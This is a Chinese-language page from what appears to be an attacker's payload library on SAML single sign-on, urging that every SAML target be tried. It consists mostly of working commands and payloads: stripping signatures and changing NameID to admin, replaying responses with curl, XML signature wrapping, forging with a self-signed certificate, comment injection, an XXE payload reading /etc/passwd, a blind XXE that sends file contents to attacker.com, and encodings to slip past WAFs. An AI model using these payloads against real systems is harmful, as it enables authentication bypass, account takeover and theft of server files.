# SAML payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:SAML XML Wrapping / Signature Stripping / XSW / Comment Injection / SAMLRaider 类攻击。任何使用 SAML SSO 的目标都试。

---

### SAML漏洞  `auth-saml`
SAML断言攻击
子类：**SAML** · tags: `auth` `saml` `xml`

**前置条件：** 使用SAML SSO

**攻击链：**

**1. XML签名绕过**
_SAML Raider工具_
```
# SAML断言篡改 - 删除签名验证:
# 1. 拦截SAML Response(Burp Suite):
# POST /saml/acs 中的SAMLResponse参数

# 2. Base64解码:
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# 3. 修改断言中的NameID(提权为admin):
# 原始: <NameID>user@target.com</NameID>
# 修改: <NameID>admin@target.com</NameID>

# 4. 删除签名块(删除整个<Signature>...</Signature>):
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml > saml_modified.xml

# 5. 重新Base64编码并替换:
base64 -w0 saml_modified.xml | xclip -sel clip

# 6. 在Burp中用修改后的值替换SAMLResponse参数
```

**2. XXE攻击**
_SAML基于XML_
```
# SAML XXE注入攻击:
# 1. 解码SAML Response后，在XML声明后注入DTD:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

# 2. 带外数据外泄(Blind XXE):
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

# evil.dtd内容:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%payload;

# 3. Base64编码后替换SAMLResponse参数发送
```

**3. SAML Response篡改与重放**  _[linux]_
_SAML Response篡改身份信息和重放攻击_
```
# 1. 拦截SAML Response:
# Burp Suite中拦截POST到/saml/acs的请求
# SAMLResponse参数是Base64编码的XML

# 2. 解码并修改:
echo "BASE64_SAML_RESPONSE" | base64 -d > saml_resp.xml

# 3. 修改关键字段:
# - NameID: 修改为目标用户 (admin@target.com)
# - Audience: 确保匹配SP
# - Conditions/NotBefore/NotOnOrAfter: 确保时间有效

# 使用xmlstarlet修改:
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion"   -u "//saml:NameID" -v "admin@target.com" saml_resp.xml > modified.xml

# 4. 重新编码提交:
cat modified.xml | base64 -w0 > encoded.txt
curl -d "SAMLResponse=$(cat encoded.txt)&RelayState=/" "http://target.com/saml/acs"

# 5. 重放攻击(如果未检查InResponseTo/时间):
# 直接重放之前抓到的有效SAMLResponse
curl -d "SAMLResponse=PREVIOUSLY_CAPTURED&RelayState=/" "http://target.com/saml/acs"
```

**4. SAML签名绕过高级技术**  _[linux]_
_SAML签名绕过的多种高级技术_
```
# 1. 签名包装攻击(XSW - XML Signature Wrapping):
# 将签名的断言移到XML其他位置，注入恶意断言
# 有8种XSW攻击变体

# 使用SAML Raider (Burp插件):
# - 拦截SAMLResponse
# - 选择XSW攻击类型(1-8)
# - 修改NameID为admin
# - 重放

# 2. 签名排除(如果SP不验证签名):
# 删除XML中的<ds:Signature>整个节点
xmlstarlet ed -N ds="http://www.w3.org/2000/09/xmldsig#"   -d "//ds:Signature" saml_resp.xml > no_sig.xml

# 3. 自签名证书替换:
# 生成自签名证书:
openssl req -new -x509 -days 365 -nodes -newkey rsa:2048   -keyout my.key -out my.crt -subj "/CN=Evil IDP"

# 使用xmlsec1签名:
xmlsec1 --sign --privkey-pem my.key --id-attr:ID Assertion saml_resp.xml

# 4. Comment注入绕过:
# admin<!-- -->@target.com 可能被解析为 admin@target.com
# 在NameID中注入: admin@target.com<!---->.evil.com
```

**WAF/EDR 绕过变体：**

**1. SAML XML混淆绕过WAF**  _[linux]_
_XML编码混淆和多种格式变体绕过WAF对SAML的检测_
```
# 1. XML编码混淆:
# 使用CDATA段包裹payload:
<NameID><![CDATA[admin@target.com]]></NameID>

# 2. DTD定义实体:
<!DOCTYPE foo [<!ENTITY user "admin@target.com">]>
<NameID>&user;</NameID>

# 3. XML命名空间混淆:
<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
             xmlns:x="http://evil.com">admin@target.com</saml:NameID>

# 4. 编码SAMLResponse的不同方式:
# 标准Base64:
cat saml.xml | base64 -w0
# 带换行的Base64:
cat saml.xml | base64
# URL编码后的Base64:
cat saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# 5. Deflate+Base64(某些实现接受):
python3 -c "import zlib,base64; print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())).decode())"
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`12-jwt.md`](12-jwt.md)
